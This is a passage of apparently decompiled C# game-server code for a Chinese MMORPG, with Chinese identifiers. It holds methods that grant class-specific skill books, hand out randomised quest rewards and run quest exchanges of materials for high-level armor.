						break;
					case 909000005:
						if (base.Player_WuXun >= 物品数量)
						{
							result = true;
						}
						break;
					}
				}
			}
			return result;
		}

		public void 发送六转技能书(int 空位)
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			int value = 0;
			switch (base.Player_Job)
			{
			case 1:
				value = ((base.Player_Zx != 1) ? 1000000342 : 1000000336);
				break;
			case 2:
				value = ((base.Player_Zx != 1) ? 1000000343 : 1000000337);
				break;
			case 3:
				value = ((base.Player_Zx != 1) ? 1000000344 : 1000000338);
				break;
			case 4:
				value = ((base.Player_Zx != 1) ? 1000000345 : 1000000339);
				break;
			case 5:
				value = ((base.Player_Zx != 1) ? 1000000346 : 1000000340);
				break;
			case 6:
				value = ((base.Player_Zx != 1) ? 1000000347 : 1000000341);
				break;
			case 7:
				value = ((base.Player_Zx != 1) ? 1000000497 : 1000000494);
				break;
			case 8:
				value = 1000000567;
				break;
			case 9:
			{
				int num = 得到包裹空位(this);
				if (num == -1)
				{
					num = 35;
				}
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000001010), num, BitConverter.GetBytes(1), new byte[56]);
				return;
			}
			case 10:
				value = ((base.Player_Zx != 1) ? 1000001107 : 1000001106);
				break;
			case 11:
				value = 1000001532;
				break;
			case 12:
				value = 1000001164;
				break;
			case 13:
				value = 1000001284;
				break;
			}
			增加物品2(bytes, BitConverter.GetBytes(value), 空位, BitConverter.GetBytes(1), new byte[56]);
		}

		public void 发送七转技能书(int 空位)
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			int value = 0;
			switch (base.Player_Job)
			{
			case 1:
				value = ((base.Player_Zx != 1) ? 1000000394 : 1000000388);
				break;
			case 2:
				value = ((base.Player_Zx != 1) ? 1000000395 : 1000000389);
				break;
			case 3:
				value = ((base.Player_Zx != 1) ? 1000000396 : 1000000390);
				break;
			case 4:
				value = ((base.Player_Zx != 1) ? 1000000397 : 1000000391);
				break;
			case 5:
				value = ((base.Player_Zx != 1) ? 1000000398 : 1000000392);
				break;
			case 6:
				value = ((base.Player_Zx != 1) ? 1000000399 : 1000000393);
				break;
			case 7:
				value = ((base.Player_Zx != 1) ? 1000000498 : 1000000495);
				break;
			case 8:
				value = 1000000568;
				break;
			case 10:
				value = ((base.Player_Zx != 1) ? 1000001109 : 1000001108);
				break;
			case 11:
				value = 1000001533;
				break;
			case 12:
				value = 1000001165;
				break;
			case 13:
				value = 1000001286;
				break;
			}
			增加物品2(bytes, BitConverter.GetBytes(value), 空位, BitConverter.GetBytes(1), new byte[56]);
		}

		public void 发送八转技能书(int 空位)
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			int value = 0;
			switch (base.Player_Job)
			{
			case 1:
				value = ((base.Player_Zx != 1) ? 1000000470 : 1000000464);
				break;
			case 2:
				value = ((base.Player_Zx != 1) ? 1000000471 : 1000000465);
				break;
			case 3:
				value = ((base.Player_Zx != 1) ? 1000000472 : 1000000466);
				break;
			case 4:
				value = ((base.Player_Zx != 1) ? 1000000473 : 1000000467);
				break;
			case 5:
				value = ((base.Player_Zx != 1) ? 1000000474 : 1000000468);
				break;
			case 6:
				value = ((base.Player_Zx != 1) ? 1000000475 : 1000000469);
				break;
			case 7:
				value = ((base.Player_Zx != 1) ? 1000000499 : 1000000496);
				break;
			case 8:
				value = 1000000569;
				break;
			case 9:
				value = 1000001013;
				break;
			case 10:
				value = ((base.Player_Zx != 1) ? 1000001111 : 1000001110);
				break;
			case 11:
				value = 1000001534;
				break;
			case 12:
				value = 1000001166;
				break;
			case 13:
				value = 1000001287;
				break;
			}
			增加物品2(bytes, BitConverter.GetBytes(value), 空位, BitConverter.GetBytes(1), new byte[56]);
		}

		public void 发送九转技能书(int 空位)
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			int value = 0;
			switch (base.Player_Job)
			{
			case 1:
				value = ((base.Player_Zx != 1) ? 1000001039 : 1000001032);
				break;
			case 2:
				value = ((base.Player_Zx != 1) ? 1000001040 : 1000001033);
				break;
			case 3:
				value = ((base.Player_Zx != 1) ? 1000001041 : 1000001034);
				break;
			case 4:
				value = ((base.Player_Zx != 1) ? 1000001042 : 1000001035);
				break;
			case 5:
				value = ((base.Player_Zx != 1) ? 1000001043 : 1000001036);
				break;
			case 6:
				value = ((base.Player_Zx != 1) ? 1000001044 : 1000001037);
				break;
			case 7:
				value = ((base.Player_Zx != 1) ? 1000001045 : 1000001038);
				break;
			case 8:
				value = 1000001046;
				break;
			case 9:
				value = 1000001047;
				break;
			case 10:
				value = ((base.Player_Zx != 1) ? 1000001113 : 1000001112);
				break;
			case 11:
				value = 1000001535;
				break;
			case 12:
				value = 1000001167;
				break;
			case 13:
				value = 1000001288;
				break;
			}
			增加物品2(bytes, BitConverter.GetBytes(value), 空位, BitConverter.GetBytes(1), new byte[56]);
		}

		public void 发送十转技能书()
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			int value = 0;
			switch (base.Player_Job)
			{
			case 1:
				value = ((base.Player_Zx != 1) ? 1000001192 : 1000001191);
				break;
			case 2:
				value = ((base.Player_Zx != 1) ? 1000001194 : 1000001193);
				break;
			case 3:
				value = ((base.Player_Zx != 1) ? 1000001196 : 1000001195);
				break;
			case 4:
				value = ((base.Player_Zx != 1) ? 1000001198 : 1000001197);
				break;
			case 5:
				value = ((base.Player_Zx != 1) ? 1000001200 : 1000001199);
				break;
			case 6:
				value = ((base.Player_Zx != 1) ? 1000001202 : 1000001201);
				break;
			case 7:
				value = ((base.Player_Zx != 1) ? 1000001204 : 1000001203);
				break;
			case 8:
				value = 1000001205;
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000001223), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
				break;
			case 9:
				value = 1000001206;
				break;
			case 10:
				value = ((base.Player_Zx != 1) ? 1000001208 : 1000001207);
				break;
			case 11:
				value = 1000001209;
				break;
			case 12:
				value = 1000001210;
				break;
			case 13:
				value = 1000001289;
				break;
			}
			增加物品2(bytes, BitConverter.GetBytes(value), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
		}

		public void 发送十一转技能书()
		{
			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			int value = 0;
			switch (base.Player_Job)
			{
			case 1:
				value = ((base.Player_Zx != 1) ? 1000001321 : 1000001320);
				break;
			case 2:
				value = ((base.Player_Zx != 1) ? 1000001323 : 1000001322);
				break;
			case 3:
				value = ((base.Player_Zx != 1) ? 1000001325 : 1000001324);
				break;
			case 4:
				value = ((base.Player_Zx != 1) ? 1000001327 : 1000001326);
				break;
			case 5:
				value = ((base.Player_Zx != 1) ? 1000001329 : 1000001328);
				break;
			case 6:
				value = ((base.Player_Zx != 1) ? 1000001331 : 1000001330);
				break;
			case 7:
				value = ((base.Player_Zx != 1) ? 1000001333 : 1000001332);
				break;
			case 8:
				value = 1000001334;
				增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000001335), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
				break;
			case 9:
				value = 1000001336;
				break;
			case 10:
				value = ((base.Player_Zx != 1) ? 1000001338 : 1000001337);
				break;
			case 11:
				value = 1000001339;
				break;
			case 12:
				value = 1000001340;
				break;
			case 13:
				value = 1000001341;
				break;
			}
			增加物品2(bytes, BitConverter.GetBytes(value), 得到包裹空位(this), BitConverter.GetBytes(1), new byte[56]);
		}

		public void 新学气功(int 气功位置, int type)
		{
			if (type == 0)
			{
				if (BitConverter.ToInt16(气功[气功位置].气功_byte, 0) == 255)
				{
					气功[气功位置] = new 气功类(new byte[2])
					{
						气功ID = 得到气功ID(气功位置, base.Player_Job)
					};
					更新武功和状态();
				}
			}
			else
			{
				气功[气功位置] = new 气功类(new byte[2])
				{
					气功ID = 得到气功ID(气功位置, base.Player_Job)
				};
				更新武功和状态();
			}
		}

		public void 奖励任务道具(ConcurrentDictionary<int, 阶段奖励物品类> 奖励物品)
		{
			foreach (阶段奖励物品类 value2 in 奖励物品.Values)
			{
				switch (value2.物品ID)
				{
				case 800000002:
				{
					for (int num18 = 0; num18 < value2.物品数量; num18++)
					{
						int num19 = RNG.Next(0, 100);
						int num20;
						if (num19 >= 0 && num19 < 50)
						{
							num20 = RNG.Next(200002, 200008);
						}
						else if (num19 >= 50 && num19 < 80)
						{
							num20 = RNG.Next(1100015, 1100040);
							if (num20 % 2 != 0)
							{
								num20--;
							}
						}
						else
						{
							num20 = RNG.Next(300015, 300040);
							if (num20 % 2 != 0)
							{
								num20--;
							}
						}
						int num21 = 得到包裹空位(this);
						if (num21 == -1)
						{
							num21 = 0;
						}
						AddItemWithProperties(800000002, num21, 1, num20, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000001:
				{
					for (int n = 0; n < value2.物品数量; n++)
					{
						int num4 = RNG.Next(0, 100);
						int num5;
						if (num4 >= 0 && num4 < 30)
						{
							num5 = RNG.Next(100004, 100015);
						}
						else if (num4 >= 30 && num4 < 70)
						{
							num5 = RNG.Next(700005, 700025);
						}
						else if (num4 >= 70 && num4 < 90)
						{
							num5 = RNG.Next(300015, 300040);
							if (num5 % 2 != 0)
							{
								num5--;
							}
						}
						else
						{
							num5 = 800001;
						}
						int num6 = 得到包裹空位(this);
						if (num6 == -1)
						{
							num6 = 0;
						}
						AddItemWithProperties(800000001, num6, 1, num5, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 909000001:
					base.人物经验 += value2.物品数量;
					计算人物基本数据3();
					更新经验和历练();
					continue;
				case 909000002:
					base.Player_ExpErience += value2.物品数量;
					更新经验和历练();
					continue;
				case 909000004:
					base.Player_Money += (uint)value2.物品数量;
					得到钱的提示((uint)value2.物品数量);
					更新金钱和负重();
					continue;
				case 909000005:
					base.Player_WuXun += value2.物品数量;
					更新武功和状态();
					continue;
				case 800000023:
				{
					for (int num10 = 0; num10 < value2.物品数量; num10++)
					{
						int num11 = RNG.Next(0, 100);
						int num13;
						if (num11 >= 0 && num11 < 30)
						{
							num13 = RNG.Next(100008, 100020);
						}
						else if (num11 >= 30 && num11 < 70)
						{
							num13 = RNG.Next(700015, 700030);
						}
						else if (num11 >= 70 && num11 < 90)
						{
							num13 = RNG.Next(300025, 300050);
							if (num13 % 2 != 0)
							{
								num13--;
							}
						}
						else
						{
							num13 = 800002;
						}
						int num14 = 得到包裹空位(this);
						if (num14 == -1)
						{
							num14 = 0;
						}
						AddItemWithProperties(800000023, num14, 1, num13, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000024:
				{
					for (int l = 0; l < value2.物品数量; l++)
					{
						int num36 = RNG.Next(0, 100);
						int num37;
						if (num36 >= 0 && num36 < 50)
						{
							num37 = RNG.Next(200005, 200010);
						}
						else if (num36 >= 50 && num36 < 80)
						{
							num37 = RNG.Next(1100025, 1100080);
							if (num37 % 2 != 0)
							{
								num37--;
							}
						}
						else
						{
							num37 = RNG.Next(300025, 300050);
							if (num37 % 2 != 0)
							{
								num37--;
							}
						}
						int num38 = 得到包裹空位(this);
						if (num38 == -1)
						{
							num38 = 0;
						}
						AddItemWithProperties(800000024, num38, 1, num37, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000025:
				{
					for (int j = 0; j < value2.物品数量; j++)
					{
						int 物品属性2 = RNG.Next(1000010, 1000020);
						int num12 = 得到包裹空位(this);
						if (num12 == -1)
						{
							num12 = 0;
						}
						AddItemWithProperties(800000001, num12, 1, 物品属性2, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000026:
				{
					for (int i = 0; i < value2.物品数量; i++)
					{
						int 物品属性 = RNG.Next(700010, 700025);
						int num = 得到包裹空位(this);
						if (num == -1)
						{
							num = 0;
						}
						AddItemWithProperties(800000001, num, 1, 物品属性, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000028:
				{
					for (int num26 = 0; num26 < value2.物品数量; num26++)
					{
						string s2 = "200" + RNG.Next(1, 6) + "000";
						int num27 = 得到包裹空位(this);
						if (num27 == -1)
						{
							num27 = 0;
						}
						AddItemWithProperties(800000028, num27, 1, int.Parse(s2), 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000030:
				{
					for (int num22 = 0; num22 < value2.物品数量; num22++)
					{
						Random random4 = new Random();
						int num24 = random4.Next(0, 101);
						int 物品属性6 = ((num24 >= 0 && num24 < 20) ? random4.Next(100005, 100016) : ((num24 >= 20 && num24 < 40) ? random4.Next(700008, 700026) : ((num24 >= 40 && num24 < 60) ? random4.Next(1000008, 1000021) : ((num24 < 60 || num24 >= 90) ? random4.Next(1500001, 1500006) : random4.Next(200001, 200016)))));
						int num25 = 得到包裹空位(this);
						if (num25 == -1)
						{
							num25 = 0;
						}
						AddItemWithProperties(800000030, num25, 1, 物品属性6, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000031:
				{
					for (int num15 = 0; num15 < value2.物品数量; num15++)
					{
						Random random3 = new Random();
						int num16 = random3.Next(0, 101);
						int 物品属性5 = ((num16 >= 0 && num16 < 20) ? random3.Next(100005, 100016) : ((num16 >= 20 && num16 < 40) ? random3.Next(700008, 700026) : ((num16 >= 40 && num16 < 60) ? random3.Next(1000008, 1000021) : ((num16 < 60 || num16 >= 90) ? random3.Next(1500001, 1500006) : random3.Next(200001, 200016)))));
						int num17 = 得到包裹空位(this);
						if (num17 == -1)
						{
							num17 = 0;
						}
						AddItemWithProperties(800000031, num17, 1, 物品属性5, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000032:
				{
					for (int num7 = 0; num7 < value2.物品数量; num7++)
					{
						Random random2 = new Random();
						int num8 = random2.Next(0, 101);
						int 物品属性4 = ((num8 >= 0 && num8 < 20) ? random2.Next(100005, 100016) : ((num8 >= 20 && num8 < 40) ? random2.Next(300010, 300051) : ((num8 >= 40 && num8 < 60) ? random2.Next(1000008, 1000021) : ((num8 < 60 || num8 >= 90) ? random2.Next(500010, 500021) : random2.Next(200001, 200016)))));
						int num9 = 得到包裹空位(this);
						if (num9 == -1)
						{
							num9 = 0;
						}
						AddItemWithProperties(800000032, num9, 1, 物品属性4, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000033:
				{
					for (int m = 0; m < value2.物品数量; m++)
					{
						Random random = new Random();
						int num2 = random.Next(0, 101);
						int 物品属性3 = ((num2 >= 0 && num2 < 20) ? random.Next(100005, 100016) : ((num2 >= 20 && num2 < 40) ? random.Next(300010, 300051) : ((num2 >= 40 && num2 < 60) ? random.Next(1000008, 1000021) : ((num2 < 60 || num2 >= 90) ? random.Next(500010, 500021) : random.Next(200001, 200016)))));
						int num3 = 得到包裹空位(this);
						if (num3 == -1)
						{
							num3 = 0;
						}
						AddItemWithProperties(800000033, num3, 1, 物品属性3, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 800000013:
				{
					for (int k = 0; k < value2.物品数量; k++)
					{
						int num23 = 0;
						string str = "0000";
						int num33 = RNG.Next(0, 125);
						int num34 = ((num33 >= 0 && num33 <= 40) ? 8 : ((num33 > 40 && num33 <= 70) ? 9 : ((num33 > 70 && num33 <= 90) ? 12 : ((num33 <= 90 || num33 > 110) ? 15 : 13))));
						switch (num34)
						{
						case 8:
							num23 = 1;
							str = "0000";
							break;
						case 9:
							num23 = 1;
							break;
						case 12:
							num23 = 10;
							break;
						case 13:
							num23 = 5;
							break;
						case 15:
							num23 = 1;
							break;
						}
						string s = ((num34 != 12) ? (num34 + str + num23) : (num34 + "000" + num23));
						int num35 = 得到包裹空位(this);
						if (num35 == -1)
						{
							num35 = 0;
						}
						AddItemWithProperties(800000013, num35, 1, int.Parse(s), 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					continue;
				}
				case 909000003:
					continue;
				}
				if (!World.Itme.TryGetValue(value2.物品ID, out var value))
				{
					continue;
				}
				switch (value.FLD_PID)
				{
				case 1000000186:
				{
					int num30 = 得到包裹空位(this);
					if (num30 == -1)
					{
						num30 = 35;
					}
					AddItemWithProperties(value2.物品ID, num30, value2.物品数量, value.FLD_MAGIC0, value.FLD_MAGIC1, value.FLD_MAGIC2, value.FLD_MAGIC3, value.FLD_MAGIC4, 0, 0, 0, 1, 0);
					break;
				}
				case 1008000003:
				case 1008000044:
				case 1008000045:
				case 1008000055:
				{
					for (int num28 = 0; num28 < value2.物品数量; num28++)
					{
						int num29 = 得到包裹空位(this);
						if (num29 == -1)
						{
							num29 = 35;
						}
						AddItemWithProperties(value2.物品ID, num29, 1, value.FLD_MAGIC0, value.FLD_MAGIC1, value.FLD_MAGIC2, value.FLD_MAGIC3, value.FLD_MAGIC4, 0, 0, 0, 1, 0);
					}
					break;
				}
				}
				if (value.FLD_QUESTITEM == 1)
				{
					设置任务物品(value2.物品ID, value2.物品数量);
					continue;
				}
				for (int num31 = 0; num31 < value2.物品数量; num31++)
				{
					int num32 = 得到包裹空位(this);
					if (num32 == -1)
					{
						num32 = 0;
					}
					AddItemWithProperties(value2.物品ID, num32, 1, value.FLD_MAGIC0, value.FLD_MAGIC1, value.FLD_MAGIC2, value.FLD_MAGIC3, value.FLD_MAGIC4, 0, 0, 0, 0, 0);
				}
			}
		}

		public void 风云之纹章武勋(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 227:
				num = 1;
				break;
			case 230:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000635);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num || base.Player_Level < 60)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num);
				AddItemWithProperties(1000000290, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 义斗关势力战武勋(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 221:
				num = 1;
				break;
			case 224:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000600);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 5 || base.Player_Level < 60)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 5)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 5);
				AddItemWithProperties(1000000290, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换130金龙战靴(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 384:
				num = 1;
				break;
			case 385:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000635);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 15 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 15)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 15);
				AddItemWithProperties(1000000560, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换130金龙护手(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 382:
				num = 1;
				break;
			case 383:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000600);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 80 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 80)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 80);
				AddItemWithProperties(1000000557, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换130金龙甲(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 380:
				num = 1;
				break;
			case 381:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(1000000924);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 30 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 30)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 30);
				AddItemWithProperties(1000000554, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换120绣龙战靴(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 378:
				num = 1;
				break;
			case 379:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000635);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 10 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 10)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 10);
				AddItemWithProperties(1000000559, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换120绣龙护手(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 376:
				num = 1;
				break;
			case 377:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(900000600);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 50 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 50)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 50);
				AddItemWithProperties(1000000556, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换120绣龙甲(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 374:
				num = 1;
				break;
			case 375:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(1000000924);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 20 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 20)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 20);
				AddItemWithProperties(1000000553, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

		public void 任务兑换110纹龙甲(int rwid, int czid, int czjd)
		{
			int num = 0;
			switch (rwid)
			{
			case 368:
				num = 1;
				break;
			case 369:
				num = 1;
				break;
			}
			int num2 = 获取背包物品位置(1000000924);
			switch (czid)
			{
			case 1:
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 15 || base.Player_Level < 100)
				{
					任务提示数据发送(rwid, 12, czjd);
				}
				else
				{
					任务提示数据发送(rwid, 11, czjd);
				}
				break;
			case 2:
			{
				if (num2 == -1 || 装备栏包裹[num2].Get物品数量 < num * 15)
				{
					任务提示数据发送(rwid, 12, 1);
					break;
				}
				int num3 = GetEmptyBagSlot();
				if (num3 == -1)
				{
					任务提示数据发送(rwid, 12, 1);
					系统提示("背包不足");
					break;
				}
				任务提示数据发送(rwid, 21, 1);
				减去物品(num2, num * 15);
				AddItemWithProperties(1000000552, num3, num, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				任务提示数据发送(rwid, 41, 0);
				break;
			}
			case 3:
				任务提示数据发送(rwid, 31, czjd);
				break;
			case 4:
				if (任务.ContainsKey(rwid))
				{
					任务.TryRemove(rwid, out var _);
				}
				任务提示数据发送(rwid, 41, czjd);
				break;
			case 5:
				任务提示数据发送(rwid, 51, czjd);
				base.当前操作NPC = 0;
				base.当前操作类型 = 0;
				break;
			}
		}

